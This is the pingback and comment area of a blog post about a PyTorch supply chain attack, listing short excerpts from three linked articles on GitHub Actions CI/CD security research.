  4. [TensorFlow CI/CD Flaw Exposed Supply Chain to Poisoning Attacks](https://moodsecurity.com/tensorflow-ci-cd-flaw-exposed-supply-chain-to-poisoning-attacks/)

[January 18, 2024](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/comment-page-1/#comment-504)

[…] public GitHub repositories, including those associated with Chia Networks, Microsoft DeepSpeed, and PyTorch, are susceptible to malicious code injection via self-hosted GitHub Actions […]

[Like](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/?like_comment=504&_wpnonce=9d1c4cfb59)Like

[Reply](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/comment-page-1/?replytocom=504#respond)

  5. [Fixing Typos and Breaching Microsoft’s Perimeter – John Stawinski IV](https://johnstawinski.com/2024/04/15/fixing-typos-and-breaching-microsofts-perimeter/)

[April 15, 2024](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/comment-page-1/#comment-517)

[…] of our other attacks, like our attack on PyTorch, required implantation, reconnaissance, crazy token pivots, and secret stealing to prove impact. […]

[Like](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/?like_comment=517&_wpnonce=4d59cfc09e)Like

[Reply](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/comment-page-1/?replytocom=517#respond)

  6. [Black Hat and DEF CON Preview: “Grand Theft Actions” or “Continuous Integration, Continuous Destruction”? – John Stawinski IV](https://johnstawinski.com/2024/07/30/black-hat-and-def-con-preview-grand-theft-actions-or-continuous-integration-continuous-destruction/)

[July 30, 2024](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/comment-page-1/#comment-525)

[…] from our PyTorch compromise blog post with another conference submission teaser. If you want to do some background reading, there’s a […]

[Like](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/?like_comment=525&_wpnonce=d22adafc83)Like

[Reply](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/comment-page-1/?replytocom=525#respond)

### Leave a comment [Cancel reply](/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#respond)

Δ
